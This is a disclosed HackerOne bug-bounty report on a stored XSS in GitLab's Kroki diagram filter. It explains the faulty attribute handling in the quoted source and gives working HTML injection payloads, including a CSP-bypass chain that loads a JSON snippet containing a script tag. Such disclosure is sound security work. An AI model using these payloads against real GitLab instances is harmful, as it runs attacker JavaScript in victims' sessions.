# Stored XSS via Kroki diagram

## Report Details
- **Report ID**: 1731349
- **URL**: https://hackerone.com/reports/1731349
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-12-17T10:52:08.221Z
- **Disclosed**: 2023-06-02T01:55:16.700Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

If Kroki has been enabled, it's possible to craft a `pre` block so that arbitrary attributes can be injected into the resulting `img` tag. 

The css selector for finding a valid node to convert into a kroki diagram checks for either `pre[lang="#{diagram_type}"] > code` or for `pre > code[lang="#{diagram_type}"]`, but the diagram type is then set using `node.parent['lang'] || node['lang']`.

So if the `code` block has a valid lang (such as `wavedrom`) then the css selector will match, but if the parent `pre` also has a `lang` attribute then it will be the one that is used and can be an arbitrary value.

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L17
```ruby
        diagram_selectors = ::Gitlab::Kroki.formats(settings)
                                .map do |diagram_type|
                                  %(pre[lang="#{diagram_type}"] > code,
                                  pre > code[lang="#{diagram_type}"])
                                end
                                .join(', ')

        xpath = Gitlab::Utils::Nokogiri.css_to_xpath(diagram_selectors)
        return doc unless doc.at_xpath(xpath)

        diagram_format = "svg"
        doc.xpath(xpath).each do |node|
          diagram_type = node.parent['lang'] || node['lang']
          diagram_src = node.content
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
```

The `diagram_type` is then used as-is to create a url, which is used to create an image with `<img src="#{image_src}" />`. So if a double quote is used in the `diagram_type` then arbitrary attributes can be added (apart from `class` as that is replaced just below).

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/lib/banzai/filter/kroki_filter.rb#L31
```ruby
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
          img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src="#{image_src}" />))
          img_tag = img_tag.children.first

          next if img_tag.nil?

          lazy_load = diagram_src.length > MAX_CHARACTER_LIMIT
          img_tag.set_attribute('hidden', '') if lazy_load
          img_tag.set_attribute('class', 'js-render-kroki')

          img_tag.set_attribute('data-diagram', diagram_type)
          img_tag.set_attribute('data-diagram-src', "data:text/plain;base64,#{Base64.strict_encode64(diagram_src)}")

          node.parent.replace(img_tag)
```

### Steps to reproduce

1. On a self-hosted gitlab, ensure that `Kroki` is enabled at `/admin/application_settings/general`{F2080922} 
1. Create an issue and use the following payload `<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>`
1. Reload/Visit the issue
1. If you do not have CSP enabled you will see the alert pop, otherwise you will see a CSP violation in the console such as `Refused to execute inline event handler because it violates the following Content Security Policy directive`

Since the `class` attribute cannot be set finding a CSP bypass was a bit tricky but there are still a few `data` based attributes that can be used, one of them being `data-diff-for-path` from `single_file_diff.js`. This is used as the path to load when the "expand diff" chevron is clicked allowing an arbitrary json file to be loaded and have jquery execute it to bypass the CSP.

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.6.2-ee/app/assets/javascripts/single_file_diff.js#L77
```javascript
    return axios
      .get(this.diffForPath)
      .then(({ data }) => {
        this.loadingContent.hide();
        if (data.html) {
          this.content = $(data.html);
```

Since clicking the chevron is a bit unlikely, we can inject the `style` attribute to make the kroki overlay the entire page,  which when clicked injects some styles to make the `chevron` now overlay the entire page. 

1. Enable CSP on gitlab - https://docs.gitlab.com/omnibus/settings/configuration.html#set-a-content-security-policy
1. Create a public snippet  with a json file `aaa.json` containing `{"html":"<script>alert(document.domain)</script>"}`, then open the `raw` version and make note of the path.
1. Create a new project and commit a readme
1. View the individual commit (eg http://gitlab.wbowling.info/root/kroki1/-/commit/f4170b940214abeebc6fd7503f9500c72c358613)
1. Add a comment to a line of the commit using the following payload, replacing `data-diff-for-path` with the path to your json file noted above:
```html
<a>
    <pre lang='/" data-diff-for-path=/root/kroki1/-/snippets/9/raw/main/aaa.json '>
        <code lang="wavedrom">csp</code>
    </pre>
    <pre
        lang='/" id=stage1 style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;" data-triggers="click" data-toggle=popover data-html=true data-title="aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb" data-content=ggg '>
    <code lang="wavedrom">
    bypass
    </code>
    </pre>
</a>
```
1. Reload the page
1. Clicking anywhere on the page twice will trigger the xss

{F2080931}

### Impact

Allows arbitrary javascript to be executed when a victim views a comment 

### What is the current *bug* behavior?

The the lang attribute from the parent node is always used even if the css selector matches the child node

### What is the expected *correct* behavior?

The lang attribute should only be used if it is actually valid. The `img` tag should also be created using `content_tag` instead of string concatination.

### Output of checks
#### Results of GitLab environment info

```
$ sudo gitlab-rake gitlab:env:info

System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.6p219
Gem Version:	3.1.6
Bundler Version:2.3.15
Rake Version:	13.0.6
Redis Version:	6.2.7
Sidekiq Version:6.5.7
Go Version:	unknown

GitLab information
Version:	15.6.2-ee
Revision:	08b668e8740
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.12
URL:		http://gitlab.wbowling.info
HTTP Clone URL:	http://gitlab.wbowling.info/some-group/some-project.git
SSH Clone URL:	git@gitlab.wbowling.info:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.13.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

## Impact
Allows arbitrary javascript to be executed when a victim views a comment 


## Attachments
- image.png
- gitlab-csp.mp4
